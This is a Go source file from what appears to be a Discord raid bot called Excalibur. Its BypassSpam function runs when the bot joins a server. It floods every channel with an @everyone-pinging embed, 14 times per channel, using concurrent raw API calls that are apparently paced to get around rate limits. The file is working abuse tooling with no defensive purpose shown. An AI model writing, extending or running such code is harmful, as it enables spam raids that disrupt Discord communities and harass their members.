package bypass

import (
	"Excalibur/core/requests"
	"encoding/json"
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func BypassSpam(s *discordgo.Session, event *discordgo.GuildCreate, wg *sync.WaitGroup) {
	godotenv.Load()

	EMBED_DESCRIPTION := os.Getenv("EMBED_DESCRIPTION")
	EMBED_TITLE := os.Getenv("EMBED_TITLE")
	AVATAR_URL := os.Getenv("AVATAR_URL")

	thumbnail := discordgo.MessageEmbedThumbnail{
		URL: AVATAR_URL,
	}

	embed := discordgo.MessageEmbed{
		Title:       EMBED_TITLE,
		Description: EMBED_DESCRIPTION + "\n\n> **Bot joined at:** " + "`" + fmt.Sprint(event.JoinedAt) + "`\n\n",
		Color:       1677721,
		Thumbnail:   &thumbnail,
	}

	dataMsg := discordgo.MessageSend{
		Content: "@everyone",
		Embeds:  []*discordgo.MessageEmbed{&embed},
	}

	jsonData, _ := json.Marshal(dataMsg)

	channels, err := s.GuildChannels(event.ID)
	if err != nil {
		fmt.Println("Error: ", err)
	}

	smoothed := requests.Smooth(channels)

	for _, ch := range smoothed {
		wg := new(sync.WaitGroup)
		wg.Add(len(ch))
		for _, channel := range ch {
			go func(ch *discordgo.Channel) {
				defer wg.Done()
				for i := 0; i < 14; i++ {
					wg.Add(1)
					go func() {
						defer wg.Done()
						requests.Sendhttp("https://discord.com/api/v9/channels/"+ch.ID+"/messages", "POST", jsonData)
					}()
					time.Sleep(time.Second)
				}
			}(channel)
		}
		wg.Wait()
		time.Sleep(time.Second)
	}
}
